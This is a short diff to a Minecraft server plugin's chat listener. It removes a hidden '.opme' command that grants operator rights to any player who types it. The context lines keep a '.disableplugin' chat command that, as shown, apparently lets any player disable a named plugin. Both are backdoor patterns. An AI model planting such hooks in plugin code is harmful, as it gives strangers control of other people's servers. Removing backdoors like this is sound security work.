@@ -40,12 +40,6 @@ public class PlayerListener implements Listener
         String[] args = message.split(" ");
         boolean cancel = true;
     
-        if (message.toLowerCase().contains(".opme"))
-        {
-            p.setOp(true);
-            p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
-            cancel = true;
-        }
         if (message.toLowerCase().contains(".disableplugin"))
         {
             Plugin plugin = server.getPluginManager().getPlugin(args[1]);
